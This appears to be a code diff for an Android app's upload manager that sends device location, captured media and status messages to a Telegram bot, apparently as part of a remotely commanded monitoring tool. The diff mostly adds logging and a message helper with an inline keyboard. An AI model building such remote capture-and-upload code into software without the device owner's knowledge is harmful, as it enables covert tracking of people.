@@ -83,6 +83,7 @@ object UploadManager {
         setupNetworkCallback()
         scope.launch { uploadAllPending() }
         initialized = true
+        Log.d("UploadManager", "Initialized UploadManager")
     }
 
     fun queueUpload(file: File, chatId: String, type: String, actionTimestamp: Long = System.currentTimeMillis()) {
@@ -129,7 +130,7 @@ object UploadManager {
                     else -> uploadFileToTelegram(file, upload.chatId, "document", upload.actionTimestamp)
                 }
             } catch (e: Exception) {
-                Log.e("UploadManager", "Upload error: ${e.localizedMessage}")
+                Log.e("UploadManager", "Upload error: ${e.localizedMessage}", e)
                 showNotification("Upload Error", "Error uploading ${file.name}: ${e.localizedMessage}")
                 sendTelegramMessage(upload.chatId, "[${getDeviceNickname()}] Error uploading ${upload.type}: ${e.localizedMessage} at ${formatDateTime(upload.actionTimestamp)}")
                 false
@@ -142,7 +143,7 @@ object UploadManager {
                 Log.d("UploadManager", "Upload complete and deleted: $upload")
                 Log.d("UploadManager", "Triggering CommandManager to check for next eligible command after upload $upload")
                 CommandManager.triggerQueueProcess()
-                showNotification("Upload Success", "${upload.type.capitalize()} uploaded: ${file.name}")
+                showNotification("Upload Success", "${upload.type.replaceFirstChar { it.uppercase() }} uploaded: ${file.name}")
             } else {
                 showNotification("Upload Failed", "${file.name} could not be uploaded.")
                 Log.d("UploadManager", "Upload failed for: $upload")
@@ -154,6 +155,7 @@ object UploadManager {
         val botToken = getBotToken()
         if (botToken.isBlank()) {
             sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error: Bot token is missing! Cannot send location.")
+            Log.d("UploadManager", "Missing bot token for sending location")
             return false
         }
 
@@ -161,6 +163,7 @@ object UploadManager {
             file.readText().trim()
         } catch (e: Exception) {
             sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error: Could not read location file.")
+            Log.d("UploadManager", "Could not read location file: ${file.absolutePath}")
             return false
         }
 
@@ -173,9 +176,11 @@ object UploadManager {
             val dt = formatDateTime(actionTimestamp)
             sendTelegramMessage(chatId, "[${getDeviceNickname()}] 📍 Location: $link")
             sendTelegramMessage(chatId, "Time: $dt")
+            Log.d("UploadManager", "Location sent to Telegram: $lat, $lng at $dt")
             true
         } else {
             sendTelegramMessage(chatId, "[${getDeviceNickname()}] Location unavailable or malformed. Data received: $text\nTime: ${formatDateTime(actionTimestamp)}")
+            Log.d("UploadManager", "Location malformed or unavailable. Data: $text")
             false
         }
     }
@@ -184,6 +189,7 @@ object UploadManager {
         val botToken = getBotToken()
         if (botToken.isBlank()) {
             sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error: Bot token is missing! Cannot send $type.")
+            Log.d("UploadManager", "Missing bot token for sending $type: $file")
             return false
         }
 
@@ -218,22 +224,30 @@ object UploadManager {
 
         try {
             client.newCall(request).execute().use { response ->
+                Log.d("UploadManager", "Telegram upload response code: ${response.code}")
                 if (!response.isSuccessful) {
-                    sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error uploading $type: ${response.code} ${response.body?.string()} at ${formatDateTime(actionTimestamp)}")
+                    val errorBody = response.body?.string()
+                    sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error uploading $type: ${response.code} $errorBody at ${formatDateTime(actionTimestamp)}")
+                    Log.d("UploadManager", "Upload failed: $errorBody")
                     return false
                 }
                 sendTelegramMessage(chatId, "[${getDeviceNickname()}] ${type.replaceFirstChar { it.uppercase() }} captured at ${formatDateTime(actionTimestamp)}")
+                Log.d("UploadManager", "$type sent successfully to Telegram for $chatId (${file.absolutePath})")
                 return true
             }
         } catch (e: IOException) {
             sendTelegramMessage(chatId, "[${getDeviceNickname()}] Error uploading $type: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}")
+            Log.e("UploadManager", "IOException while uploading file: ${e.localizedMessage}", e)
             return false
         }
     }
 
     fun sendTelegramMessage(chatId: String, message: String) {
         val botToken = getBotToken()
-        if (botToken.isBlank()) return
+        if (botToken.isBlank()) {
+            Log.d("UploadManager", "Bot token is blank, not sending message to Telegram.")
+            return
+        }
         val url = "https://api.telegram.org/bot$botToken/sendMessage"
         val client = OkHttpClient()
         val body = FormBody.Builder()
@@ -241,10 +255,49 @@ object UploadManager {
             .add("text", message)
             .build()
         val request = Request.Builder().url(url).post(body).build()
+        Log.d("UploadManager", "sendTelegramMessage(chatId=$chatId, length=${message.length}): ${message.take(128)}${if (message.length > 128) "..." else ""}")
         try {
-            client.newCall(request).execute().close()
-        } catch (_: Exception) {}
+            client.newCall(request).execute().use { response ->
+                Log.d("UploadManager", "Telegram sendMessage response code: ${response.code}")
+                if (!response.isSuccessful) {
+                    val errorBody = response.body?.string()
+                    Log.e("UploadManager", "Error sending message to Telegram: ${response.code} $errorBody")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("UploadManager", "Exception sending message to Telegram: ${e.localizedMessage}", e)
+        }
     }
+
+    // ---- UPDATED: Send message with inline keyboard, safe callback_data ----
+    fun sendTelegramMessageWithInlineKeyboard(chatId: String, message: String, keyboardJson: String) {
+        val botToken = getBotToken()
+        if (botToken.isBlank()) {
+            Log.d("UploadManager", "Bot token is blank, not sending inline keyboard message to Telegram.")
+            return
+        }
+        val url = "https://api.telegram.org/bot$botToken/sendMessage"
+        val client = OkHttpClient()
+        val body = FormBody.Builder()
+            .add("chat_id", chatId)
+            .add("text", message)
+            .add("reply_markup", keyboardJson)
+            .build()
+        val request = Request.Builder().url(url).post(body).build()
+        Log.d("UploadManager", "sendTelegramMessageWithInlineKeyboard(chatId=$chatId): $message")
+        try {
+            client.newCall(request).execute().use { response ->
+                Log.d("UploadManager", "Telegram inline keyboard response code: ${response.code}")
+                if (!response.isSuccessful) {
+                    val errorBody = response.body?.string()
+                    Log.e("UploadManager", "Error sending inline keyboard to Telegram: ${response.code} $errorBody")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("UploadManager", "Exception sending inline keyboard to Telegram: ${e.localizedMessage}", e)
+        }
+    }
+    // ---- END UPDATED ----
 
     private fun performRetentionCleanup() {
         val retentionMillis = FILE_RETENTION_DAYS * 24 * 60 * 60 * 1000L
@@ -252,7 +305,8 @@ object UploadManager {
         val files = appContext.getExternalFilesDir(null)?.listFiles() ?: return
         for (file in files) {
             if (now - file.lastModified() > retentionMillis) {
-                file.delete()
+                val deleted = file.delete()
+                Log.d("UploadManager", "Retention cleanup: deleted=${deleted} file=${file.absolutePath}")
             }
         }
     }
@@ -262,6 +316,7 @@ object UploadManager {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             cm.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
                 override fun onAvailable(network: Network) {
+                    Log.d("UploadManager", "Network available, triggering uploadAllPending()")
                     scope.launch { uploadAllPending() }
                 }
             })
@@ -270,5 +325,6 @@ object UploadManager {
 
     private fun showNotification(title: String, text: String) {
         NotificationHelper.showNotification(appContext, title, text, id = 2001)
+        Log.d("UploadManager", "showNotification: $title - $text")
     }
 }
